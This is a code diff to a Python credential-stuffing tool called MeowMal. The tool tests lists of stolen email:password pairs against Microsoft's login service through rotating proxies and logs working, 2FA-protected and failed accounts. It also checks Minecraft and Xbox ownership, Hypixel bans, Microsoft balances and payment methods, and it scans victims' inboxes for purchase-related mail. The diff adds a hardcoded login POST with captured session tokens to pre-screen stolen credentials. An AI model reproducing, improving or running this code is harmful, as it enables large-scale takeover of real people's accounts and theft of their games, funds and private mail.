@@ -326,10 +326,7 @@ class UIManager:
         self.clear_from_cursor()
         self.log_area_count = 0
     def clear_screen(self):
-        if os.name == 'nt':
-            os.system('cls')
-        else:
-            os.system('clear')
+        os.system('cls') if os.name == 'nt' else os.system('clear')
     def move_cursor_home(self):
         print('\x1b[H', end='')
     def clear_from_cursor(self):
@@ -340,7 +337,7 @@ class UIManager:
         if not getattr(self, 'log_initialized', False):
             self.clear_screen()
             _title = Fore.CYAN
-            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: O.8 | Dev: MeowMal Dev's \n"
+            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: O.9 | Dev: MeowMal Dev's \n"
             print(Fore.CYAN + ascii_logo + Style.RESET_ALL)
             print('')
             print(f'{_title}Live Logs{Style.RESET_ALL}' + ' ' * max(0, getattr(self, 'width', 120) - len(self._strip_ansi('Live Logs'))))
@@ -686,6 +683,7 @@ class MicrosoftChecker:
             return addresses
         except Exception:
             return []
+
     def check_inbox(self, keywords):
         try:
             scope = 'https://substrate.office.com/User-Internal.ReadWrite'
@@ -795,6 +793,7 @@ def check_microsoft_account(session, email, password, config, fname):
                         write_dedupe(fname, 'inboxes.txt', f'{email}:{password} | Inbox - {formatted_results}\n')
                         return ('inbox_results', inbox_results)
             return None
+
         try:
             check_balance()
         except: pass
@@ -853,9 +852,6 @@ class ConfigLoader:
         self.settings = {'max_retries': 4, 'timeout': 15, 'threads': 100, 'use_proxies': False, 'check_xbox_game_pass': True, 'check_minecraft_ownership': True, 'check_hypixel_rank': True, 'check_payment': False, 'auto_proxy': False, 'proxy_api': '', 'request_num': 3, 'proxy_time': 5, 'check_microsoft_balance': False, 'check_rewards_points': False, 'check_payment_methods': False, 'check_subscriptions': False, 'check_orders': False, 'check_billing_address': False, 'scan_inbox': False, 'save_bad': False, 'inbox_keywords': 'Microsoft,Steam,Xbox,Game Pass,Purchase,Order,Confirmation,Receipt,Payment'}
         self.config = configparser.ConfigParser()
         self.update_config_schema()
-        
-        with open(self.config_file, 'w', encoding='utf-8') as f:
-            self.config.write(f)
         print(f'{Fore.GREEN}✓ Created default configuration file: {self.config_file}{Fore.RESET}')
     def update_config_schema(self):
         defaults = {
@@ -905,6 +901,7 @@ class ConfigLoader:
                 'check_reward_points': 'False',
                 'check_orders': 'False',
                 'check_payment_methods': 'False',
+
                 'check_email_access': 'True',
                 'check_two_factor': 'True'
             },
@@ -1120,6 +1117,7 @@ class Capture:
         self.ms_orders = []
         self.ms_payment_methods = []
         self.inbox_matches = []
+        self.ban_checked = False
     def builder(self, mask_password=False, include_timestamp=False):
         if self.banned is None:
             ban_status = '[Unknown]'
@@ -1538,13 +1536,16 @@ class Capture:
             return
         if not config.get('hypixelban'):
             return
+        if self.ban_checked:
+            return
+        self.ban_checked = True
         try:
             auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
             auth_token.profile = Profile(id_=self.uuid, name=self.name)
             tries = 0
             while tries < maxretries:
                 connection = Connection('mc.hypixel.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={'1.8', 47})
-
+                
                 original_handle_exception = connection._handle_exception
                 def safe_handle_exception(e, exc_info):
                     try:
@@ -1561,7 +1562,7 @@ class Capture:
                              except:
                                  pass
                              return
-                        if isinstance(e, ConnectionAbortedError) or isinstance(e, ConnectionResetError) or (isinstance(e, OSError) and hasattr(e, 'errno') and e.errno == 104):
+                        if isinstance(e, ConnectionAbortedError) or isinstance(e, ConnectionResetError) or (isinstance(e, OSError) and hasattr(e, 'winerror') and e.winerror == 10053):
                             return
                         if isinstance(e, AttributeError) and "'NoneType' object has no attribute 'send'" in error_str:
                             return
@@ -1583,7 +1584,7 @@ class Capture:
                         pass
                     original_handle_exception(e, exc_info)
                 connection._handle_exception = safe_handle_exception
-
+                
                 @connection.listener(clientbound_login.DisconnectPacket, early=True)
                 def login_disconnect(packet):
                     try:
@@ -1639,9 +1640,7 @@ class Capture:
                                 ui.increment_stat('banned')
                     except Exception as e:
                         self.banned = f"Error parsing ban: {str(e)}"
-                        if UI_ENABLED and ui:
-                            ui.log_error(f"Ban parse error: {e}")
-
+                
                 @connection.listener(clientbound_play.DisconnectPacket, early=True)
                 def play_disconnect(packet):
                     login_disconnect(packet)
@@ -1657,7 +1656,6 @@ class Capture:
                             time.sleep(1.0)
                             connection.disconnect()
                         threading.Thread(target=delayed_disconnect).start()
-
                 @connection.listener(clientbound_play.JoinGamePacket, early=True)
                 def joined_server(packet):
                     _mark_unbanned('JoinGame')
@@ -1673,9 +1671,9 @@ class Capture:
                 @connection.listener(clientbound_play.RespawnPacket, early=True)
                 def respawn(packet):
                     _mark_unbanned('Respawn')
-
                 try:
                     try:
+                        connected = False
                         if len(banproxies) > 0:
                             with proxy_lock:
                                 proxy = random.choice(banproxies)
@@ -1686,16 +1684,11 @@ class Capture:
                                     ip_port = proxy.split(':')
                                     socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                                 socket.socket = socks.socksocket
-                                
-                                original_stderr = sys.stderr
-                                sys.stderr = StringIO()
-                                try:
-                                    connection.connect()
-                                finally:
-                                    sys.stderr = original_stderr
+                                connection.connect()
                         else:
                             connection.connect()
-                        
+
+                        connected = True
                         c = 0
                         while self.banned == None and c < 3000:
                             time.sleep(0.01)
@@ -1703,7 +1696,7 @@ class Capture:
                         connection.disconnect()
                     except:
                         pass
-
+                    
                     if self.banned is None:
                         self.banned = '[Error] Connection Timeout/No Packet'
 
@@ -1717,7 +1710,6 @@ class Capture:
                     if self.banned != None:
                         break
                     tries += 1
-                    sys.stderr = original_stderr
                 except Exception:
                     pass
         except Exception:
@@ -2119,7 +2111,7 @@ def get_urlPost_sFTTag(session):
         time.sleep(0.1)
     return (None, None, session)
 def get_xbox_rps(session, email, password, urlPost, sFTTag):
-    global bad, checked, cpm, twofa, retries, checked
+    global bad, checked, cpm, twofa, retries
     tries = 0
     while tries < maxretries:
         try:
@@ -2516,7 +2508,7 @@ def claim_buddypass_offers(session, xbox_token, fname):
         pass
 
 def checkmc(session, email, password, token, xbox_token):
-    global retries, bedrock, cpm, checked, xgp, xgpu, other, config
+    global retries, cpm, checked, xgp, xgpu, other, config
     acctype = None
     attempts = 0
     max_time = time.time() + 45
@@ -2587,45 +2579,6 @@ def checkmc(session, email, password, token, xbox_token):
             except:
                 pass
             return True
-        elif acctype == 'Normal Minecraft':
-            with file_lock:
-                with open(f'results/{fname}/Normal.txt', 'a') as f:
-                    f.write(f'{email}:{password}\n')
-            try:
-                capture_mc(token, session, email, password, acctype)
-            except:
-                pass
-            return True
-        else:
-            others = []
-            if 'product_minecraft_bedrock' in checkrq.text:
-                others.append('Minecraft Bedrock')
-            if 'product_legends' in checkrq.text:
-                others.append('Minecraft Legends')
-            if 'product_dungeons' in checkrq.text:
-                others.append('Minecraft Dungeons')
-            if others != []:
-                with stats_lock:
-                    other += 1
-                items = ', '.join(others)
-                open(f'results/{fname}/Other.txt', 'a').write(f'{email}:{password} | {items}\n')
-                meowapi_stats = ''
-                if 'username:' in items:
-                    try:
-                        username = items.split('username:')[1].split(',')[0].strip()
-                        if username and username != 'N/A':
-                            stats = fetch_meowapi_stats(username)
-                            if stats:
-                                meowapi_stats = f' | MeowAPI: {stats}'
-                    except Exception:
-                        pass
-                if UI_ENABLED and ui:
-                    ui.add_log(f'Other: {email} | {items}{meowapi_stats}', 'INFO')
-                return True
-            else:
-                return True
-    else:
-        return False
 def mc_token(session, uhs, xsts_token):
     global retries
     attempts = 0
@@ -2656,8 +2609,7 @@ RE_RETURN_URL = re.compile(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)')
 def create_optimized_session():
     session = requests.Session()
     session.verify = False
-    import urllib3
-    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    
     session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'DNT': '1', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'})
     
     pool_size = 4
@@ -2742,11 +2694,9 @@ def authenticate(email, password, use_optimized=False):
                     except:
                         pass
                 
-                if config.get('check_microsoft_balance') or config.get('check_rewards_points') or config.get('scan_inbox'):
+                if check_microsoft_account and (config.get('check_microsoft_balance') or config.get('check_reward_points') or config.get('scan_inbox')):
                     try:
-                         checker_instance = Checker(email, password)
-                         checker_instance.session = session
-                         checker_instance.check_microsoft_features()
+                        ms_results = check_microsoft_account(session, email, password, config.data, fname)
                     except:
                         pass
                 
@@ -2921,6 +2871,91 @@ def getproxy():
                 ui.log_error(f'Proxy format error: {str(e)}')
             return {}
     return {}
+def pre_check_combo(email, password):
+    
+    global twofa, maxretries, fname
+    
+    url = "https://login.live.com/ppsecure/post.srf"
+    
+    params = {
+        'nopa': "2", 'client_id': "7d5c843b-fe26-45f7-9073-b683b2ac7ec3",
+        'cobrandid': "8058f65d-ce06-4c30-9559-473c9275a65d", 'contextid': "F3FB0F6AB3D6991E",
+        'opid': "5F188DEDF4A1266A", 'bk': "1768757278",
+        'uaid': "b1d1e6fbf8b24f9b8a73b347b178d580", 'pid': "15216"
+    }
+    
+    payload = {
+        'ps': "2", 'psRNGCDefaultType': "", 'psRNGCEntropy': "", 'psRNGCSLK': "",
+        'canary': "", 'ctx': "", 'hpgrequestid': "",
+        'PPFT': "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$",
+        'PPSX': "P", 'NewUser': "1", 'FoundMSAs': "", 'fspost': "0", 'i21': "0",
+        'CookieDisclosure': "0", 'IsFidoSupported': "1", 'isSignupPost': "0",
+        'isRecoveryAttemptPost': "0", 'i13': "0", 'login': email, 'loginfmt': email,
+        'type': "11", 'LoginOptions': "3", 'lrt': "", 'lrtPartition': "",
+        'hisRegion': "", 'hisScaleUnit': "", 'cpr': "0", 'passwd': password
+    }
+    
+    headers = {
+        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        'Accept-Encoding': "gzip, deflate, br, zstd", 'Cache-Control': "max-age=0",
+        'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
+        'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': "\"Android\"",
+        'sec-ch-ua-platform-version': "\"12.0.0\"", 'Origin': "https://login.live.com",
+        'Upgrade-Insecure-Requests': "1", 'Sec-Fetch-Site': "same-origin",
+        'Sec-Fetch-Mode': "navigate", 'Sec-Fetch-User': "?1", 'Sec-Fetch-Dest': "document",
+        'Referer': "https://login.live.com/oauth20_authorize.srf?nopa=2&client_id=7d5c843b-fe26-45f7-9073-b683b2ac7ec3&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&contextid=F3FB0F6AB3D6991E&ru=https%3A%2F%2Fuser.auth.xboxlive.com%2Fdefault.aspx&flowtoken=-Dlvz*VDmPVZZLUB5XJxsfDMTTcQljOxDsdPjDKzToqZjduHY6H8mvZDBmfh64KLbJ2nZ9eoEak3Z5i9cv6QnWc1AgKNCTVjbsdSkMM2udkvn*tMhRNlP*KMzWSv4xope0Tedsx0fH4ExWXxj47d!shbqu5cb72XzFK*iJMoesP5oeS*!QeCOp1srGs2ds7c0wcllXOmhW9BF5JvWeVnY4ggTVh*w4TUyV!keqrvHLOJZENELnYgCp5EjzPwdp2QPhnupdnWEyUzkQIzzXeB0HN4BAZJhJpQo3U8Hd3J4Z16oG7vbJZEpdHLpaxVe7RfSvg%24%24&uaid=b1d1e6fbf8b24f9b8a73b347b178d580&opid=5F188DEDF4A1266A",
+        'Accept-Language': "ar,en-US;q=0.9,en;q=0.8,ku;q=0.7,ro;q=0.6"
+    }
+    
+    current_try = 0
+    while current_try <= maxretries:
+        try:
+            proxy_config = None
+            if proxytype != "'4'":
+                try: proxy_config = getproxy()
+                except: pass
+                
+            response = requests.post(url, params=params, data=payload, headers=headers, proxies=proxy_config, timeout=15)
+            status_code = response.status_code
+            response_text = response.text.lower()
+            
+            if status_code >= 500 or status_code == 429:
+                current_try += 1
+                time.sleep(1.5)
+                continue
+                
+            two_fa_indicators = ['suggestedaction', 'sign in to continue', 'enter code', 'two-step', 'two. step', 'two factor', '2fa', 'second verification', 'verification code', 'authenticator', 'texted you', 'sent a code', 'enter the code', 'additional security', 'extra security']
+            if any(ind in response_text for ind in two_fa_indicators):
+                with open(f'results/{fname}/2fa.txt', 'a') as file:
+                    file.write(f'{email}:{password}\n')
+                if UI_ENABLED and ui:
+                    ui.log_2fa(email)
+                with stats_lock:
+                    twofa += 1
+                return "2FA"
+                
+            success_indicators = ['to do that, sign in', 'welcome', 'redirecting', 'location.href', 'home.live.com', 'account.microsoft.com', 'myaccount.microsoft.com', 'profile.microsoft.com', 'https://account.live.com/', 'microsoft account home', 'signed in successfully', "you're signed in"]
+            if any(ind in response_text for ind in success_indicators):
+                return "HIT"
+                
+            failure_indicators = ['invalid username or password', "that microsoft account doesn't exist", 'incorrect password', 'your account or password is incorrect', "sorry, that password isn't right", 'entered is incorrect', "account doesn't exist", 'no account found', 'wrong password', 'incorrect credentials', 'login failed', 'sign in unsuccessful', "we couldn't find an account", 'please check your credentials', 'sign-in was blocked', 'account is locked', 'suspended', 'temporarily locked', 'security challenge', 'unusual activity', 'verify your identity', 'account review', 'safety concerns']
+            if any(ind in response_text for ind in failure_indicators):
+                return "BAD"
+                
+            return "UNKNOWN"
+            
+        except requests.exceptions.RequestException:
+            current_try += 1
+            time.sleep(1.5)
+            continue
+        except Exception as e:
+            if UI_ENABLED and ui:
+                ui.log_error(f'Precheck error {email}: {str(e)[:40]}')
+            return "ERROR"
+            
+    return "ERROR"
+
 def Checker(combo):
     global bad, checked, cpm, hits, errors
     start_time = time.time()
@@ -2954,7 +2989,18 @@ def Checker(combo):
             return
         result = False
         try:
-            result = authenticate(str(email), str(password), use_optimized=True)
+            bypass = pre_check_combo(str(email), str(password))
+            
+            if bypass == "HIT" or bypass == "UNKNOWN":
+                result = authenticate(str(email), str(password), use_optimized=True)
+            elif bypass == "2FA":
+
+                result = True 
+            elif bypass == "BAD":
+                result = False
+            else:
+                result = False
+                
             if warn_on_slow and time.time() - start_time > warn_threshold:
                 if UI_ENABLED and ui:
                     ui.add_log(f'Other: Slow check (> {warn_threshold}s): {email}', 'INFO')
@@ -3006,6 +3052,7 @@ def logscreen():
             ui.show_ui_screen()
         time.sleep(1)
 
+
 def load_proxy_file():
     global proxylist
     filename = None
@@ -3055,13 +3102,14 @@ def Load():
             for line in lines:
                 line = line.strip()
                 if line and ':' in line:
-                    parts = line.split(':', 1)
-                    email_lower = ''.join(c for c in parts[0].strip().lower() if c.isprintable() and not c.isspace())
-                    password = parts[1].strip()
-                    dedupe_key = f'{email_lower}:{password}'
-                    if dedupe_key not in seen:
-                        seen.add(dedupe_key)
-                        unique_lines.append(line)
+                    parts = line.split(':')
+                    if len(parts) >= 2:
+                        email_lower = ''.join(c for c in parts[0].strip().lower() if c.isprintable() and not c.isspace())
+                        password = parts[1].strip()
+                        dedupe_key = f'{email_lower}:{password}'
+                        if dedupe_key not in seen:
+                            seen.add(dedupe_key)
+                            unique_lines.append(line)
             Combos = unique_lines
             dupes_removed = len(lines) - len(Combos)
             if dupes_removed > 0:
@@ -3108,6 +3156,7 @@ def loadconfig():
         config.set(key, value)
     for key, value in capture_config.items():
         config.set(key, value)
+    config.set('scan_inbox', config_data.get('scan_inbox', False))
     config.set('enable_notifications', config_loader.get('enable_notifications', False))
     config.set('discord_webhook_url', config_loader.get('discord_webhook_url', ''))
     config.set('webhook_username', config_loader.get('webhook_username', 'MeowMal Checker'))
@@ -3155,7 +3204,7 @@ def loadconfig():
 def Main():
     global fname, screen, config, proxytype, banproxies, errors, cpm1, hits, bad, twofa, vm, xgp, xgpu, other, mfa, sfa, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, checked, retries
     utils.set_title("MeowMal by MeowMal Dev's")
-    os.system('clear')
+    os.system('cls') if os.name == 'nt' else os.system('clear')
     try:
         if loadconfig():
             print(f'{Fore.GREEN}✓ Configuration loaded successfully{Fore.RESET}')
@@ -3210,11 +3259,13 @@ def Main():
         if UI_ENABLED and ui:
             ui.start_checking(len(Combos))
         with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
-            futures = {executor.submit(Checker, combo): combo for combo in Combos}
+            future_to_combo = {executor.submit(Checker, combo): combo for combo in Combos}
+            processed_count = 0
             
             try:
-                for future in concurrent.futures.as_completed(futures):
-                    combo = futures[future]
+                for future in concurrent.futures.as_completed(future_to_combo):
+                    combo = future_to_combo[future]
+                    processed_count += 1
                     try:
                         future.result()
                     except Exception as e:
@@ -3227,9 +3278,13 @@ def Main():
                             ui.log_error(f'Error: {str(e)[:50]}')
                         else:
                             print(f'{Fore.RED}Worker error: {str(e)[:50]}{Fore.RESET}')
-            except KeyboardInterrupt:
-                executor.shutdown(wait=False, cancel_futures=True)
-                raise
+                    
+                    if processed_count % 1000 == 0:
+                        import gc
+                        gc.collect()
+            except Exception as e:
+                 if UI_ENABLED and ui:
+                     ui.log_error(f"Processing error: {e}")
         print(f"\n{Fore.CYAN}{'=' * 60}")
         print(f'{Fore.YELLOW}⏳ Collecting Final Live Stats...')
         print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}\n")
